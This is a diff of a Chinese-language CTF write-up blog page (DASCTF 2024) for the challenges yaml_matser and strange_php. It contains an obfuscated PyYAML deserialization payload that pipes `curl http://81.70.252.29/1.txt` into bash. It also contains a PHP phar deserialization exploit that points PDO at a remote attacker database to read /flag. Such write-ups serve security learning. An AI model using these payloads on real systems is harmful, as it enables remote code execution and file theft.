@@ -25,24 +25,25 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="DASCTF 2024最后一战 WPWEBconst_python源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://laijunyue.github.io/images/image-20250822164925212.png">
-<meta property="og:image" content="http://laijunyue.github.io/images/image-20250822164956208.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20250912125551921.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20250912125628935.png">
 <meta property="og:image" content="http://laijunyue.github.io/images/image-20250822165248448.png">
-<meta property="og:image" content="http://laijunyue.github.io/images/image-20250822165304743.png">
-<meta property="og:image" content="http://laijunyue.github.io/images/image-20250822165341062.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20250912130022707.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20250912145709985.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20250912152247292.png">
 <meta property="og:image" content="http://laijunyue.github.io/images/image-20250822165429005.png">
 <meta property="og:image" content="http://laijunyue.github.io/images/image-20250822165452591.png">
 <meta property="og:image" content="http://laijunyue.github.io/images/image-20250822165514048.png">
 <meta property="og:image" content="http://laijunyue.github.io/images/image-20250822165543746.png">
 <meta property="article:published_time" content="2024-12-28T05:01:05.000Z">
-<meta property="article:modified_time" content="2025-08-26T04:31:23.590Z">
+<meta property="article:modified_time" content="2025-09-12T09:47:45.522Z">
 <meta property="article:author" content="xiaolaisec">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="JAVA">
 <meta property="article:tag" content="PHP">
 <meta property="article:tag" content="Python">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://laijunyue.github.io/images/image-20250822164925212.png">
+<meta name="twitter:image" content="http://laijunyue.github.io/images/image-20250912125551921.png">
     
     
     <!--- Icon Part-->
@@ -361,7 +362,7 @@
 
         <div class="statistics flex justify-around my-2.5">
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">7</div>
         <div class="label text-third-text-color text-sm">Tags</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
@@ -369,7 +370,7 @@
         <div class="label text-third-text-color text-sm">Categories</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">18</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">20</div>
         <div class="label text-third-text-color text-sm">Posts</div>
     </a>
 </div>
@@ -423,8 +424,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-08-26 12:31:23</span>
-            <span class="mobile">2025-08-26 12:31:23</span>
+            <span class="desktop">2025-09-12 17:47:45</span>
+            <span class="mobile">2025-09-12 17:47:45</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -487,22 +488,23 @@
 <p>看到一个yaml反序列化，直接绕，bytes命令执行</p>
 <div class="highlight-container" data-rel="Css"><figure class="iseeu highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">exp = &#x27;__import__(&quot;os&quot;)<span class="selector-class">.system</span>(&quot;curl http://<span class="number">81.70</span>.<span class="number">252.29</span>/<span class="number">1</span>.txt|bash<span class="string">&quot;)&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(f&quot;</span><span class="built_in">exec</span>(<span class="built_in">bytes</span>([[j][<span class="number">0</span>]<span class="built_in">for</span>(i)in[<span class="built_in">range</span>(&#123;len(exp)&#125;)]<span class="selector-attr">[0]</span>for(j)in<span class="selector-attr">[range(256)]</span><span class="selector-attr">[0]</span>if<span class="selector-attr">[<span class="string">&quot;+&quot;</span>]</span>]or<span class="selector-attr">[<span class="string">&quot;.join([f&quot;</span>i]</span>in<span class="selector-attr">[[&#123;i&#125;]</span>]and<span class="selector-attr">[j]</span>in<span class="selector-attr">[[&#123;ord(j)&#125;<span class="string">&quot; for i, j in enumerate(exp)]) + &quot;</span>]</span>]]))&quot;)</span><br><span class="line">!!python/<span class="selector-tag">object</span>/new:type</span><br><span class="line">args:</span><br><span class="line">  - exp</span><br><span class="line">  - !!python/tuple []</span><br><span class="line">  - &#123;&quot;extend&quot;: !!python/name:exec &#125;</span><br><span class="line">listitems: <span class="string">&quot;exec(bytes([[j][0]for(i)in[range(29)][0]for(j)in[range(256)][0]if[i]in[[0]]and[j]in[[95]]or[i]in[[1]]and[j]in[[95]]or[i]in[[2]]and[j]in[[105]]or[i]in[[3]]and[j]in[[109]]or[i]in[[4]]and[j]in[[112]]or[i]in[[5]]and[j]in[[111]]or[i]in[[6]]and[j]in[[114]]or[i]in[[7]]and[j]in[[116]]or[i]in[[8]]and[j]in[[95]]or[i]in[[9]]and[j]in[[95]]or[i]in[[10]]and[j]in[[40]]or[i]in[[11]]and[j]in[[34]]or[i]in[[12]]and[j]in[[111]]or[i]in[[13]]and[j]in[[115]]or[i]in[[14]]and[j]in[[34]]or[i]in[[15]]and[j]in[[41]]or[i]in[[16]]and[j]in[[46]]or[i]in[[17]]and[j]in[[115]]or[i]in[[18]]and[j]in[[121]]or[i]in[[19]]and[j]in[[115]]or[i]in[[20]]and[j]in[[116]]or[i]in[[21]]and[j]in[[101]]or[i]in[[22]]and[j]in[[109]]or[i]in[[23]]and[j]in[[40]]or[i]in[[24]]and[j]in[[34]]or[i]in[[25]]and[j]in[[105]]or[i]in[[26]]and[j]in[[100]]or[i]in[[27]]and[j]in[[34]]or[i]in[[28]]and[j]in[[41]]]))&quot;</span></span><br></pre></td></tr></table></figure></div>
 
-<h3 id="strange-php"><a href="#strange-php" class="headerlink" title="strange_php"></a>strange_php</h3><p>审会源码</p>
+<h3 id="strange-php"><a href="#strange-php" class="headerlink" title="strange_php"></a>strange_php</h3><h4 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h4><p><code>通过ATTR_DEFAULT_FETCH_MODE=262152触发类的__set魔术方法</code></p>
+<p>审会源码</p>
 <p>首先看到welcome.php中</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/../images/image-20250822164925212.png"
-                      alt="image-20250822164925212"
+                     data-src="/../images/image-20250912125551921.png"
+                      alt="image-20250912125551921"
                 ></p>
 <p>这里看可以删除留言，而且message可控，跟进deleteMessage函数</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/../images/image-20250822164956208.png"
-                      alt="image-20250822164956208"
+                     data-src="/../images/image-20250912125628935.png"
+                      alt="image-20250912125628935"
                 ></p>
-<p>这里一眼顶真，可以触发phar，加上我们可以自定义留言，也就是可控上传文件的内容，所以很明显要打phar反序列化</p>
+<p>file_exists($path)可触发phar，加上我们可以自定义留言，也就是可控上传文件的内容，所以很明显要打phar反序列化</p>
 <p>我们看到UserMessage.php</p>
 <p><img  
                      lazyload
@@ -510,22 +512,32 @@
                      data-src="/../images/image-20250822165248448.png"
                       alt="image-20250822165248448"
                 ></p>
-<p>这里有个__set魔术方法，如果filePath可控的话，就可以实现任意文件读取</p>
-<p>那么怎么触发__set呢?</p>
+<p>这里有个__set魔术方法，<strong>如果filePath可控的话，就可以实现任意文件读取</strong></p>
+<p>那么怎么触发__set方法呢?</p>
 <p>看到PDO_connect.php中</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/../images/image-20250822165304743.png"
-                      alt="image-20250822165304743"
+                     data-src="/../images/image-20250912130022707.png"
+                      alt="image-20250912130022707"
                 ></p>
-<p>这里是可控的，如果我们将ATTR_DEFAULT_FETCH_MODE指定为<code>262152</code>，就可以将结果的第一列做为类名， 然后新建一个实例，在初始化属性值时，sql的列名就对应者类的属性名，如果存在某个列名，但在该类中不存在这个属性名，在赋值时就会触发类的_set方法。</p>
+<p>这里是可控的，如果我们将ATTR_DEFAULT_FETCH_MODE指定为<code>262152</code>，PDO 会<strong>将数据库查询结果的第一列作为类名</strong>，然后实例化这个类，接着它会将结果集中的<strong>列名作为属性名</strong>，<strong>列值作为属性值</strong>，尝试赋值给这个新创建的对象实例。   </p>
+<p>例如下表，当ATTR_DEFAULT_FETCH_MODE指定为<code>262152</code>时，调用<code>id字段</code>类的构造函数，然后实例化这个类，其中username、email、login_time这些列名会作为属性名，将数据库中的值赋值给对象的属性。</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>-&gt;username = <span class="string">&quot;ads&quot;</span></span><br><span class="line"><span class="variable">$id</span>-&gt;email = <span class="string">&quot;qqq@mail.com&quot;</span></span><br><span class="line"><span class="variable">$id</span>-&gt;login_time = <span class="string">&quot;2019-08-07 13:00:00&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20250912145709985.png"
+                      alt="image-20250912145709985"
+                ></p>
+<p>在初始化属性值时，sql的列名就对应类的属性名，如果存在某个列名，但在该类中不存在这个属性名，在赋值时就会触发类的_set方法。</p>
 <p>接着我们看到User.php</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/../images/image-20250822165341062.png"
-                      alt="image-20250822165341062"
+                     data-src="/../images/image-20250912152247292.png"
+                      alt="image-20250912152247292"
                 ></p>
 <p>这里可以调用到pdo中的get_connection，那么这里就是入口了</p>
 <p>我们可以让靶机连我们远程的数据库，来自定义filePath的值,在自己vps上新建个数据库和表</p>
@@ -536,15 +548,16 @@
                       alt="image-20250822165429005"
                 ></p>
 <p>链子如下:</p>
-<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$conn</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$table</span> = <span class="string">&#x27;users&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&quot;UserMessage&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&quot;aaaa&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$created_at</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;conn = <span class="keyword">new</span> <span class="title class_">PDO_connect</span>();;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PDO_connect</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$pdo</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$con_options</span> = <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;dsn&quot;</span>=&gt;<span class="string">&quot;mysql:host=81.70.252.29:3306;dbname=users;charset=utf8&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;host&#x27;</span>=&gt;<span class="string">&#x27;81.70.252.29&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;port&#x27;</span>=&gt;<span class="string">&#x27;3306&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;user&#x27;</span>=&gt;<span class="string">&#x27;joker&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>=&gt;<span class="string">&#x27;joker&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;charset&#x27;</span>=&gt;<span class="string">&#x27;utf8&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;options&#x27;</span>=&gt;<span class="keyword">array</span>(PDO::<span class="variable constant_">ATTR_DEFAULT_FETCH_MODE</span>=&gt;<span class="number">262152</span>,</span><br><span class="line"></span><br><span class="line">      PDO::<span class="variable constant_">ATTR_ERRMODE</span> =&gt; PDO::<span class="variable constant_">ERRMODE_EXCEPTION</span>)</span><br><span class="line"></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$smt</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;ppppp.phar&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;happy.txt&quot;</span>, <span class="string">&#x27;happy&#x27;</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$file_contents</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;ppppp.phar&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$file_contents</span>));</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//User.__destruct -&gt; User.log -&gt; new Pdo_connect().get_connection() -&gt; UserMessage.__set -&gt; file_get_contents(&#x27;/flag&#x27;)</span></span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$conn</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$table</span> = <span class="string">&#x27;users&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&quot;UserMessage&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&quot;aaaa&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$created_at</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;conn = <span class="keyword">new</span> <span class="title class_">PDO_connect</span>();<span class="comment">//为UserMessage类的 filePath 属性赋值为 /flag  触发UserMessage类的__set方法</span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PDO_connect</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$pdo</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$con_options</span> = <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;dsn&quot;</span>=&gt;<span class="string">&quot;mysql:host=81.70.252.29:3306;dbname=users;charset=utf8&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;host&#x27;</span>=&gt;<span class="string">&#x27;81.70.252.29&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;port&#x27;</span>=&gt;<span class="string">&#x27;3306&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;user&#x27;</span>=&gt;<span class="string">&#x27;joker&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>=&gt;<span class="string">&#x27;joker&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;charset&#x27;</span>=&gt;<span class="string">&#x27;utf8&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;options&#x27;</span>=&gt;<span class="keyword">array</span>(PDO::<span class="variable constant_">ATTR_DEFAULT_FETCH_MODE</span>=&gt;<span class="number">262152</span>,</span><br><span class="line"></span><br><span class="line">      PDO::<span class="variable constant_">ATTR_ERRMODE</span> =&gt; PDO::<span class="variable constant_">ERRMODE_EXCEPTION</span>)</span><br><span class="line"></span><br><span class="line">  );</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$smt</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;ppppp.phar&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;happy.txt&quot;</span>, <span class="string">&#x27;happy&#x27;</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$file_contents</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;ppppp.phar&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$file_contents</span>));</span><br></pre></td></tr></table></figure></div>
 
+<p>写入phar文件</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/../images/image-20250822165452591.png"
                       alt="image-20250822165452591"
                 ></p>
-<p>写入，然后删除</p>
+<p>写入，然后删除，deleteMessage触发phar反序列化</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
@@ -572,7 +585,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2025-08-26 12:31:23
+                    :</strong> 2025-09-12 17:47:45
             </li>
         
         <li>
@@ -707,7 +720,7 @@
     <div class="post-toc">
         <div class="toc-title">On this page</div>
         <div class="page-title">DASCTF 2024最后一战 WP</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#DASCTF-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98-WP"><span class="nav-text">DASCTF 2024最后一战 WP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB"><span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#const-python"><span class="nav-text">const_python</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#yaml-matser"><span class="nav-text">yaml_matser</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#strange-php"><span class="nav-text">strange_php</span></a></li></ol></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#DASCTF-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98-WP"><span class="nav-text">DASCTF 2024最后一战 WP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB"><span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#const-python"><span class="nav-text">const_python</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#yaml-matser"><span class="nav-text">yaml_matser</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#strange-php"><span class="nav-text">strange_php</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%80%83%E7%82%B9"><span class="nav-text">考点</span></a></li></ol></li></ol></li></ol></li></ol>
 
     </div>
 </div>
